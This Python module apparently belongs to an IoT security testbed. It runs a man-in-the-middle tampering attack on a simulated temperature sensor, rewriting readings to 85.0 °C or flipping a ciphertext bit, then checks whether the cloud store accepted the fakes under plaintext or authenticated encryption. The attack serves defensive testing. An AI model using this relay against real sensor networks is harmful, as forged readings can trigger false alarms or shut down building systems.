"""
module1_attacks/tampering.py - Modify data in transit (integrity attack).

Story: the attacker sits between temperature sensor temp-01 and the gateway
and changes every reading to 85.0 °C - e.g. to trigger a false fire alarm or
make the HVAC system switch off.

How the attacker changes a frame (attacker knows the protocol format):
  * readable payload  -> set temperature_c to 85.0
  * encrypted payload -> flip one bit of the ciphertext field "ct"
    (the best an attacker can do without the key)

Measured: how many tampered readings the cloud database accepted and stored.
Expected defence in secure mode: AES-GCM authentication tag + HMAC check.
"""

import base64
import time

from config import BROKER_PORT, MITM_PORT
from module1_attacks.common import broker_reasons, make_result
from module1_attacks.mitm_proxy import MitmProxy

VICTIM = "temp-01"
FAKE_VALUE = 85.0
READINGS = 10


def tamper_frame(frame):
    """Change one publish frame. Returns the modified frame (or None to leave it)."""
    if frame.get("type") != "publish":
        return None
    payload = frame.get("payload")
    if not isinstance(payload, dict):
        return None
    payload = dict(payload)
    if "temperature_c" in payload:                      # plaintext: just edit the value
        payload["temperature_c"] = FAKE_VALUE
    elif isinstance(payload.get("ct"), str):            # encrypted: flip a bit
        raw = bytearray(base64.b64decode(payload["ct"]))
        raw[0] ^= 0x01
        payload["ct"] = base64.b64encode(bytes(raw)).decode()
    else:
        return None
    frame["payload"] = payload
    return frame


def run(building):
    """Send temp-01's readings through a tampering relay and check what the cloud stored."""
    device = building.device(VICTIM)
    proxy = MitmProxy(MITM_PORT, BROKER_PORT, tamper=tamper_frame).start()
    last_id = building.db.last_reading_id()
    rejections_before = len(building.broker.rejections)
    try:
        building.reroute(device, MITM_PORT)
        for _ in range(READINGS):
            device.publish_reading()
            time.sleep(0.05)
        time.sleep(0.6)
    finally:
        building.reroute(device, BROKER_PORT)
        proxy.stop()

    stored = building.db.readings_after(last_id, VICTIM)
    accepted_fakes = [r for r in stored if r["payload"].get("temperature_c") == FAKE_VALUE]
    evidence = (f"relay modified {proxy.tampered} frames; cloud stored {len(stored)} "
                f"temp-01 readings, {len(accepted_fakes)} of them = {FAKE_VALUE} C")
    defence = "" if accepted_fakes else (broker_reasons(building, rejections_before)
                                         or "modified frames were dropped")
    return make_result("tampering", building.mode, proxy.tampered, len(accepted_fakes),
                       defence, evidence)
